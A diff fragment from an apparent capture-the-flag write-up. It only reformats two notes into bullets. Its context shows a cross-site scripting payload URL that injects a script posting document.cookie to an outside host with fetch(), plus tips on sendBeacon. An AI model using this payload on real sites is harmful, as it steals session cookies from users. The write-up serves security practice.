@@ -79,5 +79,5 @@ We get the final url for `/report`:
 `http://127.0.0.1:5000/?fulldisplay=j&auto_input=<script src="http://127.0.0.1:5000/**/fetch('***', {body: document.cookie, method: 'POST', mode:'no-cors'});//"//`
 , giving us the flag.
 > Notes:
-> I should've used a get request to make my life easier. I have also discovered `Nagivator.sendBeacon()` which seems like a quick and easy way to do requests.
-> Mixing `localhost` and `127.0.0.1` is not ideal, despite them both pointing to the same thing
+> - I should've used a get request to make my life easier. I have also discovered `Nagivator.sendBeacon()` which seems like a quick and easy way to do requests.
+> - Mixing `localhost` and `127.0.0.1` is not ideal, despite them both pointing to the same thing
